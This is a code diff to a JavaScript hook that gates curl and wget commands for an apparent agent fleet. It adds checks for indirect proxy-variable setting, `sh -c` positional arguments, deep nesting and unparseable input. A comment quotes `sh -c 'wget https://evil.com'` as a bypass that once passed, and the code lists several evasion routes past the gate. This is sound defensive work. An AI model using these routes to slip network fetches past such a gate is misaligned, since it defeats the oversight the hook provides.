@@ -92,7 +92,8 @@
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
 // Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
-// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
+// fleet. EXCEPT a command naming curl or wget, which denies on either (with the switch on this hook is
+// their only gate), and a nesting too deep to read, which denies. Every DENY is appended to the block log.
 import { readFileSync, appendFileSync, realpathSync, mkdirSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
 import { dirname, join, resolve } from 'node:path'
@@ -864,34 +865,98 @@ export function envRedirect(masked) {
   for (const m of String(masked ?? '').matchAll(ENV_REDIRECT)) if (!/^no_proxy$/i.test(m[1])) return `${m[1]}=`
   return null
 }
+// The INDIRECT ways to set a variable, next to curl / wget (#1931 delta review, non-blocking, denied
+// rather than described): `source` / `.` of a file (it can set anything), `printf -v NAME` and
+// `read NAME` with a proxy / rc name or a computed ($) name, and export / declare / typeset / local /
+// readonly of a computed name. A `while read u` loop over URLs is untouched: `u` is neither.
+const SENSITIVE_NAME = /^(?:[A-Za-z0-9]+_proxy|WGETRC|SYSTEM_WGETRC|CURL_HOME|HOME|XDG_CONFIG_HOME)$/i
+const badName = (n) => n.includes('$') || (SENSITIVE_NAME.test(n) && !/^no_proxy$/i.test(n))
+export function envIndirect(orig, masked) {
+  for (const [a, b] of spans(masked)) {
+    const w = shellWords(orig.slice(a, b))
+    const i = commandIndex(w)
+    if (i >= w.length) continue
+    const cmd = w[i].split('/').pop()
+    const rest = w.slice(i + 1)
+    if (cmd === 'source' || cmd === '.') return `${cmd} ${rest[0] ?? ''}`.trim()
+    if (cmd === 'printf') {
+      const v = rest.findIndex((x) => x === '-v')
+      if (v !== -1 && badName(rest[v + 1] ?? '$')) return `printf -v ${rest[v + 1] ?? ''}`.trim()
+    }
+    if (cmd === 'read') {
+      for (let k = 0; k < rest.length; k++) {
+        const x = rest[k]
+        if (x.startsWith('-') && x.length > 1) { if (READ_OPT_WITH_VALUE.has(x[x.length - 1])) { if (x.endsWith('a') && badName(rest[k + 1] ?? '')) return `read ${rest[k + 1]}`; k++ } continue }
+        if (badName(x)) return `read ${x}`
+      }
+    }
+    if (/^(?:export|declare|typeset|local|readonly)$/.test(cmd)) {
+      for (const x of rest) if (!x.startsWith('-') && x.split('=')[0].includes('$')) return `${cmd} ${x.split('=')[0]}`
+    }
+  }
+  return null
+}
 // A command line handed to a shell as a STRING (`bash -c '...'`, `sh -lc "..."`, `eval '...'`) is a
 // command line of its own and gets the whole analysis, like a heredoc fed to a shell. Measured
 // 2026-10-13: until then the parser never looked inside it, and `sh -c 'wget https://evil.com'` passed.
-// Returns the body, or null when `cmd` is not such a shell call.
-export function shellCommandBody(cmd, text) {
+// Returns { body, args } (args = the words after the body: $0, $1, ...), or null when `cmd` is not
+// such a shell call. The shell reads ALL its options first and takes the first non-option word as
+// the string, so `sh -c -- '<body>'` and `bash -c -e '<body>'` carry the body after them (#1931
+// delta review: the word right after -c used to be taken, so the `--` became the body).
+export function shellCommandCall(cmd, text) {
   const argv = shellWords(text)
   const at = argv.findIndex((w) => w.split('/').pop() === cmd)
   if (at === -1) return null
-  if (cmd === 'eval') return argv.slice(at + 1).join(' ')
+  if (cmd === 'eval') return { body: argv.slice(at + 1).join(' '), args: [] }
   if (!SHELL.test(cmd)) return null
+  let sawC = false
   for (let k = at + 1; k < argv.length; k++) {
     const w = argv[k]
-    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(w)) return argv[k + 1] ?? null
-    if (!w.startsWith('-') && !w.startsWith('+')) return null
+    if (w === '--' || w === '-') return sawC && k + 1 < argv.length ? { body: argv[k + 1], args: argv.slice(k + 2) } : null
+    if (!w.startsWith('-') && !w.startsWith('+')) return sawC ? { body: w, args: argv.slice(k + 1) } : null
+    if (/^[-+][A-Za-z]+$/.test(w) && w.includes('c')) sawC = true
     if (w === '-o' || w === '+o' || w === '-O' || w === '+O') k++
   }
   return null
 }
+export function shellCommandBody(cmd, text) {
+  return shellCommandCall(cmd, text)?.body ?? null
+}
+// #1931 delta review: in `sh -c '<body using "$1">' _ <url>` the URL reaches curl as $1. The
+// arguments are substituted into $0..$9 / ${0}..${9}, so the body is judged with the real
+// destination. Where substitution cannot be faithful the call is denied instead, if the body runs
+// curl or wget: "$@" / "$*" (several words), ${10}+ or ${1:-x}, shift / set -- / getopts (the
+// numbering moves),
+// or an argument that is not a plain URL-ish word (quotes, spaces, `;`, `$` would re-parse
+// differently once pasted into the body). Returns the body to judge, or null for "deny".
+const POSITIONAL_REF = /\$(?:\{[0-9@*#][^}]*\}|[0-9@*])/
+const PLAIN_ARG = /^[A-Za-z0-9._~:/?#@%+=,\[\]-]*$/
+export function positionalBody(body, args) {
+  if (!POSITIONAL_REF.test(body)) return body
+  const fetches = /\b(?:curl|wget)\b/.test(body)
+  const moves = /\b(?:shift|getopts)\b|\bset\b[^;&|\n]*(?:\s--(?:\s|$)|\s[^-+\s])/.test(body)
+  const faithful = !moves && !/\$\{?[@*]|\$\{[0-9][^}]/.test(body) && args.every((a) => PLAIN_ARG.test(a))
+  if (!faithful) return fetches ? null : body
+  return body.replace(/\$\{([0-9])\}|\$([0-9])/g, (all, a, b) => args[Number(a ?? b)] ?? '')
+}
+const NESTING_LIMIT = { deny: true, reason: 'nesting-limit', hosts: ['<too deeply nested to read>'] }
+const MAX_DEPTH = 4
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
   const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
-  if (depth < 4) {
-    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
-  }
+  // #1931 delta review: what is too deeply nested to read is DENIED, not passed unread.
+  if (inners.length && depth >= MAX_DEPTH) return NESTING_LIMIT
+  for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
+  const fetches = /\b(?:curl|wget)\b/.test(norm)
   const masked = maskInertLiterals(orig)
-  if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
-  if (/\b(?:curl|wget)\b/.test(norm)) {
-    const redirect = envRedirect(masked)
+  if (masked === null || masked.length !== orig.length) {
+    // Since curl https:// and wget can leave the deny list, this hook is their only gate: a command
+    // naming either that cannot be parsed denies, like the internal-error path. Anything else keeps
+    // the fail-open (#1931 delta review).
+    return fetches ? { deny: true, reason: 'unparseable', hosts: ['<unparseable command>'] } : { deny: false, reason: 'unparseable', hosts: [] }
+  }
+  if (fetches) {
+    const redirect = envRedirect(masked) ?? envIndirect(orig, masked)
     if (redirect) return { deny: true, reason: 'env-redirect', hosts: [redirect] }
   }
   const env = collectAssignments(orig, masked)
@@ -917,7 +982,7 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const variants = f.expands ? loopVariants(f.text, env, loops) : []
     for (const text of [plain, ...(variants ?? [])]) {
       if (shell) {
-        if (depth >= 4) break
+        if (depth >= MAX_DEPTH) return NESTING_LIMIT
         const r = classify(text, depth + 1, vendorHosts, vendorDomains)
         if (r.deny) return { ...r, reason: `heredoc-${r.reason}` }
         continue
@@ -940,8 +1005,11 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const variants = loopVariants(orig.slice(a, b), env, loops)
     for (const text of [plain, ...(variants ?? [])]) {
       const cmd = mw[i].split('/').pop()
-      const body = depth < 4 ? shellCommandBody(cmd, text) : null
-      if (body !== null) {
+      const call = shellCommandCall(cmd, text)
+      if (call !== null) {
+        if (depth >= MAX_DEPTH) return NESTING_LIMIT
+        const body = positionalBody(call.body, call.args)
+        if (body === null) return { deny: true, reason: 'shell-c-positional', hosts: ['<curl/wget argument from $1..$9, $@ or $*>'] }
         const r = classify(body, depth + 1, vendorHosts, vendorDomains)
         if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
       }
